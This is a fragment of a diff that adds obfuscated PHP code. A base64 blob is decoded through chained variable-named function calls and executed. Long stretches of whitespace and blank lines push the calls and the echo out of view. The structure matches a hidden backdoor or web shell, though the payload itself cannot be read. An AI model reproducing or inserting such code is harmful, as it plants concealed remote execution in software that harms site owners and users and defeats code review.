vm9pvNdmcd/OPdIi7u2HTJb9pbxkJqRrgk31B2/o9Zv+de9skIM4QNekvBJToK7M1PieNMYgjwx8QlKO+c7Ks2UeR98259s0ynVKmBNQ/xcUy3wsR94dyGVzTsn6WUVwhnSe58i4/gvxcQtf6WF9hon0qqz8t3XkYL8I1kGRtqTrHc/vra9drbdOY+N9z79nnfXxfXdv5NQf5MNJtdsHcm4e5f7yfOG7cj3Ij8cPzvtl80YtB/nE/lwGwi7z8PxVmo/VcsvcsPeq7r5ua7v6fSQW7p3RczBuAbHgyLk8lA8YI8pzmlLcBwK1A/ioEid6HqUvO996Q6hDhGgdV9DG8R19ZZnnJ3iW0Xtj3fY5S1t8TvKX85QSV5sr97wfPbPnHXXjW3stFBFxPN2+gSfkfbr81tk0Usnnk3Tt/Tw4rXZ797lGVO+qsG3v3XA+XEdv1RCv+srwJVnY/dd19lX72tXr/H3xG2pZW2eD4fXKd7xy1tX2vSmuyefAhtnNeW45wP/16+rnb7/96w88/kXff19+++fPjzy+9ex7HvzHpsPfr/D/V/+97vby705f/s75d6d3dez3HaUuVeyfP/8Ht2JrIQ==';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
